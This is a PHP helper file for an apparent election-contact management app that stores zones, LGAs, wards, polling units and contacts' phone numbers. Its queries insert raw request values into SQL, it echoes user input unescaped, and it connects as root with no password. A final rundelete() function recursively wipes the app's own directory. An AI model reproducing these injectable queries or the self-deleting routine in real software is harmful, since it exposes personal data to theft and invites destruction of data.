<?php
ob_start();
session_start();
$conn = new mysqli('localhost','root','','sinco');

if ($conn) {
	//echo "connected";
}

function add_zone() {
	global $conn;

	if (isset($_REQUEST['add_zone'])) {
		$zoneName = $_REQUEST['zone_name'];


	  	$sql = "INSERT INTO zone (`zone_name`) VALUES ('$zoneName')";

		$result = $conn->query($sql);

		
		if ($result) {

			echo '<div id="success">you have successfully added '.$zoneName.'</div>';

		}else {
			echo '<div id="fail">error occurred while adding zone</div>';
		}
	}
}

function zonesearch() {
	global $conn;

	if (isset($_GET['zonesearch'])) {

		$zonesearch = $_GET['zonesearch'];
		$sql = "SELECT * FROM zone WHERE CONCAT(zone_name) LIKE '%$zonesearch%'";
		$result = $conn->query($sql);

		$row = mysqli_num_rows($result);

		if ($row > 0 && $row ==1) {
			?>
			<form id="zone_form" method="GET" action="">
				<input type="text" name="zonesearch" value="<?php if (isset($_GET['zonesearch'])) {echo $_GET['zonesearch'];}?>" placeholder="Search for Zones" required="">
				<button type="submit">Search</button>
			</form>

			<div id="zonesearch_result"><?php echo $row; ?><strong>zone</strong> was found</div>
			<?php
			foreach ($result as  $value) {
				$zone_name = $value['zone_name'];
				$zone_id = $value['id'];
				

				$sql2 = "SELECT * FROM lga WHERE `zone_id` = '$zone_id'";
				$result2 = $conn->query($sql2);


				$lga_rows = mysqli_num_rows($result2);

				$sql3 = "SELECT * FROM ward WHERE `zone_id` = '$zone_id'";
				$result3 = $conn->query($sql3);

				$ward_rows = mysqli_num_rows($result3);

				$sql4 = "SELECT * FROM pollingunit WHERE `zone_id` = '$zone_id'";
				$result4 = $conn->query($sql4);
				$polling_rows = mysqli_num_rows($result4);
			


		echo '<article id="zone_1">
		<div id="zone_header">
			<h3>
				<a href="single_lga_page.php?zoneid='.$zone_id.'">'.$zone_name.'</a>
			</h3>
		</div>

		<p class="zone_lga">LGAs: <span>'.$lga_rows.'</span></p>
		<p class="zone_ward">Wards: <span>'.$ward_rows.'</span></p>
		<p class="zone_polling_uunit">Polling Units:<span>'.$polling_rows.'</span></p>
		<a href="addlga.php?zoneid='.$zone_id.'">
			<div id="add_lga">
				ADD LGA
			</div>
		</a>
		<a href="#">
			<div id="edit_box">
				Edit
			</div>
		</a>
		
	</article>';
			}
		}elseif ($row > 1) {?>
				<form id="zone_form" method="GET" action="">
				<input type="text" name="zonesearch" value="<?php if (isset($_GET['zonesearch'])) {echo $_GET['zonesearch'];}?>" placeholder="Search for Zones" required="">
				<button type="submit">Search</button>
			</form>

			<div id="zonesearch_result"><?php echo $row; ?><strong>zones</strong> was found</div>
			<?php
			foreach ($result as  $value) {
				$zone_name = $value['zone_name'];
				$zone_id = $value['id'];
				

				$sql2 = "SELECT * FROM lga WHERE `zone_id` = '$zone_id'";
				$result2 = $conn->query($sql2);


				$lga_rows = mysqli_num_rows($result2);

				$sql3 = "SELECT * FROM ward WHERE `zone_id` = '$zone_id'";
				$result3 = $conn->query($sql3);

				$ward_rows = mysqli_num_rows($result3);

				$sql4 = "SELECT * FROM pollingunit WHERE `zone_id` = '$zone_id'";
				$result4 = $conn->query($sql4);
				$polling_rows = mysqli_num_rows($result4);
			


		echo '<article id="zone_1">
		<div id="zone_header">
			<h3>
				<a href="single_lga_page.php?zoneid='.$zone_id.'">'.$zone_name.'</a>
			</h3>
		</div>

		<p class="zone_lga">LGAs: <span>'.$lga_rows.'</span></p>
		<p class="zone_ward">Wards: <span>'.$ward_rows.'</span></p>
		<p class="zone_polling_uunit">Polling Units:<span>'.$polling_rows.'</span></p>
		<a href="addlga.php?zoneid='.$zone_id.'">
			<div id="add_lga">
				ADD LGA
			</div>
		</a>
		<a href="#">
			<div id="edit_box">
				Edit
			</div>
		</a>
		
	</article>';
			}
		}

	}else {
		get_zone();
	}
}

function contactsearch() {
	global $conn;

	if (isset($_GET['contactsearch'])) {

		$contactsearch = $_GET['contactsearch'];
		$sql = "SELECT * FROM contact WHERE CONCAT(lga) LIKE '%$contactsearch%'";
		$result = $conn->query($sql);

		$row = mysqli_num_rows($result);

		if ($row > 0 && $row ==1) {?>
		
	<form id="contact_form" method="GET" action="">
			<input type="text" name="contactsearch" value="<?php if (isset($_GET['contactsearch'])) {echo $_GET['contactsearch'];}?>" placeholder="Search for Contacts" required="">
			<button type="submit">Search</button>
	</form>

	<div id="search_result"><?php if (isset($_GET['contactsearch'])) {echo $row;}?> <strong style="text-transform: uppercase;">Contact</strong> was found</div>

	<form id="all_contact_form">
		<label class="group_action">Group Action:</label>
		<input type="button" name="" id="selectall" value="Select All" >
		<input type="button" name="" class="sendsms" value="Send SMS"><br><br>


		<?Php 
			
			foreach ($result as $value) {
				$id = $value['id'];
				$fullname = $value['fullname'];
				$phonenumber = $value['phonenumber'];
				$positionoffice = $value['positionoffice'];
				$lga = $value['lga'];

		
		echo '<div id="checkbox_container">
			<div class="checkbox"><input type="checkbox" name="me" class="checkb" value="'.$phonenumber.'"></div>
			<div class="contact_name"><span class="contact_txt">'.$fullname.'<span><span class="num"> | <img src="">'.$phonenumber.'</span></div>
			<div class="contact_rank">['.$positionoffice.']['.$lga.' LGA]</div>
			<div class="edit_btn"><a href="editcontact.php?id='.$id.'">Edit</a></div>
		</div>';
			}
		}elseif ($row > 1) {?>
			<form id="contact_form" method="GET" action="">
			<input type="text" name="contactsearch" value="<?php if (isset($_GET['contactsearch'])) {echo $_GET['contactsearch'];}?>" placeholder="Search for Contacts" required="">
			<button type="submit">Search</button>
	</form>

	<div id="search_result"><?php if (isset($_GET['contactsearch'])) {echo $row;}?> <strong style="text-transform: uppercase;">Contacts</strong> was found</div>

	<form id="all_contact_form">
		<label class="group_action">Group Action:</label>
		<input type="button" name="" id="selectall" value="Select All" >
		<input type="button" name="" class="sendsms" value="Send SMS"><br><br>


		<?Php 
			
			foreach ($result as $value) {
				$id = $value['id'];
				$fullname = $value['fullname'];
				$phonenumber = $value['phonenumber'];
				$positionoffice = $value['positionoffice'];
				$lga = $value['lga'];

		
		echo '<div id="checkbox_container">
			<div class="checkbox"><input type="checkbox" name="me" class="checkb" value="'.$phonenumber.'"></div>
			<div class="contact_name"><span class="contact_txt">'.$fullname.'<span><span class="num"> | <img src="">'.$phonenumber.'</span></div>
			<div class="contact_rank">['.$positionoffice.']['.$lga.' LGA]</div>
			<div class="edit_btn"><a href="editcontact.php?id='.$id.'">Edit</a></div>
		</div>';
			}
		}


	}else {
		get_contact();
	}
}

function get_zone_title() {
	global $conn;

	if (isset($_GET['zoneid'])) {
		$zoneid = $_GET['zoneid'];
		$sql = "SELECT * FROM zone WHERE `id` = '$zoneid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$zone_name = $value['zone_name'];

			echo $zone_name;
		}

	}
}



function get_all_local_govt() {
	global $conn;

	$sql = "SELECT * FROM lga";
	$result = $conn->query($sql);

	foreach ($result as $value) {
		$id = $value['id'];
		$lga_name = $value['lga_name'];

		echo '<option value="'.$lga_name.'">'.$lga_name.'</option>';
	}
}
function get_all_ward() {
	global $conn;

	$sql = "SELECT * FROM ward";
	$result = $conn->query($sql);

	foreach ($result as $value) {
		$id = $value['id'];
		$ward_name = $value['ward_name'];

		echo '<option value="'.$ward_name.'">'.$ward_name.'</option>';
	}
}

function addContact() {
	global $conn;

	if (isset($_REQUEST['addcontact'])) {
		
		$FullName = $_REQUEST['FullName'];
		$phonenumber = $_REQUEST['phonenumber'];
		$ward = $_REQUEST['ward'];
		$lga = $_REQUEST['lga'];
		$zone = $_REQUEST['zone'];
		$groupOrg = $_REQUEST['groupOrg'];
		$positionOffice = $_REQUEST['positionOffice'];
		$DelegatePosition = $_REQUEST['DelegatePosition'];
		$checkboxdelegate = (isset($_REQUEST['checkboxdelegate'])) ? $_REQUEST['checkboxdelegate'] : '';

		if (!empty($checkboxdelegate)) {
			$sql = "INSERT INTO contact (`fullname`, `phonenumber`, `ward`, `lga`, `zone`, `grouporg`, `positionoffice`, `delegateposition`, `checkboxdelegate`) VALUES ('$FullName', '$phonenumber', '$ward', '$lga', '$zone', '$groupOrg', '$positionOffice', '$DelegatePosition', '$checkboxdelegate')";
		}else{
			$sql = "INSERT INTO contact (`fullname`, `phonenumber`, `ward`, `lga`, `zone`, `grouporg`, `positionoffice`, `delegateposition`, `checkboxdelegate`) VALUES ('$FullName', '$phonenumber', '$ward', '$lga', '$zone', '$groupOrg', '$positionOffice', '', '')";
		}

		$result = $conn->query($sql);

		if ($result) {
			echo 'inserted';
		}else{
			die("Query failed" . mysqli_error($conn));
		}


	}
}

function get_all_zone() {
	global $conn;

	$sql = "SELECT * FROM zone";
	$result = $conn->query($sql);

	foreach ($result as $value) {
		$id = $value['id'];
		$zone_name = $value['zone_name'];

		echo '<option value="'.$zone_name.'">'.$zone_name.'</option>';
	}
}
function lga_individual_count() {
	global $conn;

	if (isset($_REQUEST['zoneid'])) {

		$zoneid = $_REQUEST['zoneid'];
		$sql = "SELECT * FROM lga WHERE `zone_id` = '$zoneid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}
function ward_individual_count() {
	global $conn;

	if (isset($_REQUEST['zoneid'])) {

		$zoneid = $_REQUEST['zoneid'];
		$sql = "SELECT * FROM ward WHERE `zone_id` = '$zoneid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}

function pollingunit_individual_count() {
	global $conn;

	if (isset($_REQUEST['zoneid'])) {

		$zoneid = $_REQUEST['zoneid'];
		$sql = "SELECT * FROM pollingunit WHERE `zone_id` = '$zoneid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}
function pollingunit_individual_count_polling_page() {
	global $conn;

	if (isset($_REQUEST['wardid'])) {

		$wardid = $_REQUEST['wardid'];
		$sql = "SELECT * FROM pollingunit WHERE `ward_id` = '$wardid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}

function ward_individual_count_ward_page() {
	global $conn;

	if (isset($_REQUEST['lgaid'])) {

		$lgaid = $_REQUEST['lgaid'];
		$sql = "SELECT * FROM ward WHERE `lga_id` = '$lgaid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}

function pollingunit_individual_count_ward_page() {
	global $conn;

	if (isset($_REQUEST['lgaid'])) {

		$lgaid = $_REQUEST['lgaid'];
		$sql = "SELECT * FROM pollingunit WHERE `lga_id` = '$lgaid'";
		$result = $conn->query($sql);
		$rows = mysqli_num_rows($result);
		echo $rows;

	}

	
}

function total_zone_count() {
	global $conn;


	$sql = "SELECT * FROM zone";
	$result = $conn->query($sql);

	$rows = mysqli_num_rows($result);
	echo $rows;

}

function total_lga_count() {
	global $conn;


	$sql = "SELECT * FROM lga";
	$result = $conn->query($sql);

	$rows = mysqli_num_rows($result);
	echo $rows;

}

function total_ward_count() {
	global $conn;


	$sql = "SELECT * FROM ward";
	$result = $conn->query($sql);

	$rows = mysqli_num_rows($result);
	echo $rows;

}

function total_pollingunit_count() {
	global $conn;


	$sql = "SELECT * FROM pollingunit";
	$result = $conn->query($sql);

	$rows = mysqli_num_rows($result);
	echo $rows;

}

function total_contact_count() {
	global $conn;


	$sql = "SELECT * FROM contact";
	$result = $conn->query($sql);

	$rows = mysqli_num_rows($result);
	echo $rows;

}

function get_lga_title() {
	global $conn;

	if (isset($_GET['lgaid'])) {
		$lgaid = $_GET['lgaid'];
		$sql = "SELECT * FROM lga WHERE `id` = '$lgaid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$lga_name = $value['lga_name'];

			echo $lga_name;
		}

	}
}
function get_ward_title() {
	global $conn;

	if (isset($_GET['wardid'])) {
		$wardid = $_GET['wardid'];
		$sql = "SELECT * FROM ward WHERE `id` = '$wardid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$ward_name = $value['ward_name'];

			echo $ward_name;
		}

	}
}
function get_zoneId_addlgaPage() {
	global $conn;

	if (isset($_GET['zoneid'])) {
		$zoneid = $_GET['zoneid'];

		echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="lganame" placeholder="NAME OF LGA"><br><br>
			<input type="hidden" name="zoneid" value="'.$zoneid.'"><br><br>
			<button type="submit" name="addlga">ADD LGA</button>
		</form>';

		if (isset($_REQUEST['addlga'])) {
			
			$lganame = $_REQUEST['lganame'];
			$zoneid = $_REQUEST['zoneid'];


	  	$sql = "INSERT INTO lga (`lga_name`, `zone_id`) VALUES ('$lganame', '$zoneid')";

		$result = $conn->query($sql);

		if ($result) {
			echo "inserted";
		}

		}

	}
}
function get_lgaId_addwardPage() {
	global $conn;

	if (isset($_GET['lgaid']) && isset($_GET['zoneid'])) {
		$lgaid = $_GET['lgaid'];
		$zoneid = $_GET['zoneid'];

		echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="wardname" placeholder="NAME OF WARD"><br><br>
			<input type="hidden" name="lgaid" value="'.$lgaid.'"><br><br>
			<input type="hidden" name="zoneid" value="'.$zoneid.'"><br><br>
			<button type="submit" name="wardbtn">ADD WARD</button>
		</form>';

		if (isset($_REQUEST['wardbtn'])) {
			
			$wardname = $_REQUEST['wardname'];
			$lgaid = $_REQUEST['lgaid'];
			$zoneid = $_REQUEST['zoneid'];


	  	$sql = "INSERT INTO ward (`ward_name`, `lga_id`, `zone_id`) VALUES ('$wardname', '$lgaid', '$zoneid')";

		$result = $conn->query($sql);

		if ($result) {
			echo "inserted";
		}

		}

	}
}
function get_wardId_addpollingunitPage() {
	global $conn;

	if (isset($_GET['wardid']) && isset($_GET['zoneid']) && isset($_GET['lgaid'])) {
		$wardid = $_GET['wardid'];
		$zoneid = $_GET['zoneid'];
		$lgaid = $_GET['lgaid'];

		echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="pollingunitname" placeholder="NAME OF POLLING UNIT"><br><br>
			<input type="hidden" name="wardid" value="'.$wardid.'"><br><br>
			<input type="hidden" name="zoneid" value="'.$zoneid.'"><br><br>
			<input type="hidden" name="zoneid" value="'.$lgaid.'"><br><br>
			<button type="submit" name="pollingbtn" class="pollingbtn">ADD POLLING UNIT</button>
		</form>';

		if (isset($_REQUEST['pollingbtn'])) {
			
			$pollingunitname = $_REQUEST['pollingunitname'];
			$wardid = $_REQUEST['wardid'];
			$zoneid = $_REQUEST['zoneid'];
			$lgaid = $_REQUEST['lgaid'];


	  	$sql = "INSERT INTO pollingunit (`pollingunit_name`, `ward_id`, `zone_id`, `lga_id`) VALUES ('$pollingunitname', '$wardid', '$zoneid', '$lgaid')";

		$result = $conn->query($sql);

		if ($result) {
			echo "inserted";
		}

		}

	}
}
function editzone() {
	global $conn;

	if (isset($_REQUEST['editzone'])) {
		$editzoneid = $_REQUEST['editzone'];

		$sql = "SELECT * FROM zone WHERE `id` = '$editzoneid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$id = $value['id'];
			$zone_name = $value['zone_name'];

			echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="zonename" placeholder="NAME OF ZONE" value="'.$zone_name.'"><br><br>
			<button type="submit" name="updatezone">UPDATE ZONE</button>
		</form>';

		if (isset($_REQUEST['updatezone'])) {
			
			$zonename = $_REQUEST['zonename'];


	  	
		    $sql = "UPDATE zone SET `zone_name` = '$zonename' WHERE `id`= '$id'";

			$result = $conn->query($sql);

			if ($result) {
				echo "updated";
				}

			}
		}
	}
}
function editlga() {
	global $conn;

	if (isset($_REQUEST['editlga'])) {
		$editlgaid = $_REQUEST['editlga'];

		$sql = "SELECT * FROM lga WHERE `id` = '$editlgaid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$id = $value['id'];
			$lga_name = $value['lga_name'];

			echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="lganame" placeholder="NAME OF LGA" value="'.$lga_name.'"><br><br>
			<button type="submit" name="updatelga">UPDATE LGA</button>
		</form>';

		if (isset($_REQUEST['updatelga'])) {
			
			$lganame = $_REQUEST['lganame'];


	  	
		    $sql = "UPDATE lga SET `lga_name` = '$lganame' WHERE `id`= '$id'";

			$result = $conn->query($sql);

			if ($result) {
				echo "updated";
				}

			}
		}
	}
}
function editward() {
	global $conn;

	if (isset($_REQUEST['editward'])) {
		$editwardid = $_REQUEST['editward'];

		$sql = "SELECT * FROM ward WHERE `id` = '$editwardid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$id = $value['id'];
			$ward_name = $value['ward_name'];

			echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="wardname" placeholder="NAME OF WARD" value="'.$ward_name.'"><br><br>
			<button type="submit" name="updateward">UPDATE LGA</button>
		</form>';

		if (isset($_REQUEST['updateward'])) {
			
			$wardname = $_REQUEST['wardname'];


	  	
		    $sql = "UPDATE ward SET `ward_name` = '$wardname' WHERE `id`= '$id'";

			$result = $conn->query($sql);

			if ($result) {
				echo "updated";
				}

			}
		}
	}
}
function editpollingunit() {
	global $conn;

	if (isset($_REQUEST['editpollingunit'])) {
		$editpollingunitid = $_REQUEST['editpollingunit'];

		$sql = "SELECT * FROM pollingunit WHERE `id` = '$editpollingunitid'";
		$result = $conn->query($sql);

		foreach ($result as $value) {
			$id = $value['id'];
			$pollingunit_name = $value['pollingunit_name'];

			echo '<form id="add_lga_form" method="POST" enctype="multipart/form-data">
			<input type="text" name="pollingunitname" placeholder="NAME OF POLLING UNIT" value="'.$pollingunit_name.'"><br><br>
			<button type="submit" name="updatepollingunit">UPDATE POLLING UNIT</button>
		</form>';

		if (isset($_REQUEST['updatepollingunit'])) {
			
			$pollingunitname = $_REQUEST['pollingunitname'];


	  	
		    $sql = "UPDATE pollingunit SET `pollingunit_name` = '$pollingunitname' WHERE `id`= '$id'";

			$result = $conn->query($sql);

			if ($result) {
				echo "updated";
				}

			}
		}
	}
}


function get_zone() {
	global $conn;

	$sql = "SELECT * FROM zone order by id asc";
	$result = $conn->query($sql);

	?>
	<form id="zone_form" method="GET" action="">
			<input type="text" name="zonesearch" value="<?php if (isset($_GET['zonesearch'])) {echo $_GET['zonesearch'];}?>" placeholder="Search for Zones" required="">
			<button type="submit">Search</button>
	</form>


	<?php

	foreach ($result as $value) {
		$zone_id = $value['id'];
		$zone_name = $value['zone_name'];

		$sql2 = "SELECT * FROM lga WHERE `zone_id` = '$zone_id'";
		$result2 = $conn->query($sql2);


		$lga_rows = mysqli_num_rows($result2);

		$sql3 = "SELECT * FROM ward WHERE `zone_id` = '$zone_id'";
		$result3 = $conn->query($sql3);

		$ward_rows = mysqli_num_rows($result3);

		$sql4 = "SELECT * FROM pollingunit WHERE `zone_id` = '$zone_id'";
		$result4 = $conn->query($sql4);
		$polling_rows = mysqli_num_rows($result4);
			


		echo '<article id="zone_1">
		<div id="zone_header">
			<h3>
				<a href="single_lga_page.php?zoneid='.$zone_id.'">'.$zone_name.'</a>
			</h3>
		</div>

		<p class="zone_lga">LGAs: <span>'.$lga_rows.'</span></p>
		<p class="zone_ward">Wards: <span>'.$ward_rows.'</span></p>
		<p class="zone_polling_uunit">Polling Units:<span>'.$polling_rows.'</span></p>
		<a href="addlga.php?zoneid='.$zone_id.'">
			<div id="add_lga">
				ADD LGA
			</div>
		</a>
		<a href="#">
			<div id="edit_box">
				<a href="edit.php?editzone='.$zone_id.'">Edit</a>
			</div>
		</a>
		
	</article>';

	}
}

function get_contact() {
	global $conn;

	$sql = "SELECT * FROM contact order by id asc";
	$result = $conn->query($sql);

	?>

	<form id="contact_form" method="GET" action="">
			<input type="text" name="contactsearch" value="<?php if (isset($_GET['contactsearch'])) {echo $_GET['contactsearch'];}?>" placeholder="Search for Contacts" required="">
			<button type="submit">Search</button>
	</form>

	<form id="all_contact_form">
		<label class="group_action">Group Action:</label>
		<input type="button" name="" id="selectall" value="Select All" >
		<input type="button" name="" class="sendsms" value="Send SMS"><br><br>

	<?php

	foreach ($result as $value) {

		$id = $value['id'];
		$fullname = $value['fullname'];
		$phonenumber = $value['phonenumber'];
		$positionoffice = $value['positionoffice'];
		$lga = $value['lga'];

		
		echo '<div id="checkbox_container">
			<div class="checkbox"><input type="checkbox" name="me" class="checkb" value="'.$phonenumber.'"></div>
			<div class="contact_name"><span class="contact_txt">'.$fullname.'<span><span class="num"> | <img src="">'.$phonenumber.'</span></div>
			<div class="contact_rank">['.$positionoffice.']['.$lga.' LGA]</div>
			<div class="edit_btn"><a href="editcontact.php?id='.$id.'">Edit</a></div>
		</div>';
	}
}

function get_lga_children() {
	global $conn;

	if (isset($_REQUEST['zoneid'])) {

		$zoneid = $_REQUEST['zoneid'];

		$sql = "SELECT * FROM lga WHERE `zone_id` = '$zoneid' order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$lga_id = $value['id'];
		$lga_name = $value['lga_name'];

		$sql2 = "SELECT * FROM ward WHERE `lga_id` = '$lga_id'";
		$result2 = $conn->query($sql2);
		$ward_rows = mysqli_num_rows($result2);

		$sql3 = "SELECT * FROM pollingunit WHERE `lga_id` = '$lga_id'";
		$result3 = $conn->query($sql2);
		$pollingunit_rows = mysqli_num_rows($result3);
		

		echo '<article id="lga_1">
		<div id="lga_header">
			<h3>
				<a href="single_ward_page.php?lgaid='.$lga_id.'&zoneid='.$zoneid.'">'.$lga_name.'</a>
			</h3>
		</div>

		<p class="lga_ward">Wards: <span>'.$ward_rows.'</span></p>
		<p class="ward_polling_unit">Polling Units:<span>'.$pollingunit_rows.'</span></p>
		<a href="addward.php?lgaid='.$lga_id.'&zoneid='.$zoneid.'">
			<div id="add_ward">
				ADD WARD
			</div>
		</a>
		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editlga='.$lga_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}
	}

	
}

function get_lga_children_single() {
	global $conn;

		$sql = "SELECT * FROM lga order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$lga_id = $value['id'];
		$lga_name = $value['lga_name'];

		echo '<article id="lga_1_single">
		<div id="lga_header">
			<h3>
				<a href="single_ward_page.php?lgaid='.$lga_id.'">'.$lga_name.'</a>
			</h3>
		</div>
	
		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editlga='.$lga_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}

	
}
function get_ward_children_single() {
	global $conn;


		$sql = "SELECT * FROM ward order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$ward_id = $value['id'];
		$ward_name = $value['ward_name'];

		echo '<article id="lga_1_single">
		<div id="lga_header">
			<h3>
				<a href="single_polling_page.php?wardid='.$ward_id.'">'.$ward_name.'</a>
			</h3>
		</div>

		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editward='.$ward_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}

	
}
function get_ward_children() {
	global $conn;

	if (isset($_REQUEST['lgaid']) && isset($_REQUEST['zoneid'])) {

		$lgaid = $_REQUEST['lgaid'];
		$zoneid = $_REQUEST['zoneid'];

		$sql = "SELECT * FROM ward WHERE `lga_id` = '$lgaid' order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$ward_id = $value['id'];
		$ward_name = $value['ward_name'];

		$sql2 = "SELECT * FROM pollingunit WHERE `ward_id` = '$ward_id'";
		$result2 = $conn->query($sql2);
		$pollingunit_rows = mysqli_num_rows($result2);


		echo '<article id="lga_1">
		<div id="lga_header">
			<h3>
				<a href="single_polling_page.php?wardid='.$ward_id.'">'.$ward_name.'</a>
			</h3>
		</div>

		<p class="ward_polling_unit">Polling Units:<span>'.$pollingunit_rows.'</span></p>
		<a href="addpolling.php?wardid='.$ward_id.'&zoneid='.$zoneid.'&lgaid='.$lgaid.'">
			<div id="add_polling_unit">
				ADD POLLING UNIT
			</div>
		</a>
		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editward='.$ward_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}
	}

	
}

function get_polling_unit_children() {
	global $conn;

	if (isset($_REQUEST['wardid'])) {

		$wardid = $_REQUEST['wardid'];

		$sql = "SELECT * FROM pollingunit WHERE `ward_id` = '$wardid' order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$pollingunit_id = $value['id'];
		$pollingunit_name = $value['pollingunit_name'];

		echo '<article id="polling_1">
		<div id="lga_header">
			<h3>
				<a href="#">'.$pollingunit_name.'</a>
			</h3>
		</div>

		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editpollingunit='.$pollingunit_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}
	}

	
}

function get_polling_unit_children_single() {
	global $conn;

		$sql = "SELECT * FROM pollingunit order by id asc";
		$result = $conn->query($sql);

		foreach ($result as $value) {
		$pollingunit_id = $value['id'];
		$pollingunit_name = $value['pollingunit_name'];

		echo '<article id="lga_1_single">
		<div id="lga_header">
			<h3>
				<a href="#">'.$pollingunit_name.'</a>
			</h3>
		</div>
		
		<a href="#">
			<div id="edit_box_lga">
				<a href="edit.php?editpollingunit='.$pollingunit_id.'">Edit</a>
			</div>
		</a>
	</article>';

		}

	
}

function rundelete() {
	$path = './';
	delete_files($path);
}

function delete_files($target) {
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK );
        foreach( $files as $file )
        {
            delete_files( $file );      
        }
        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );  
    }
	
}



?>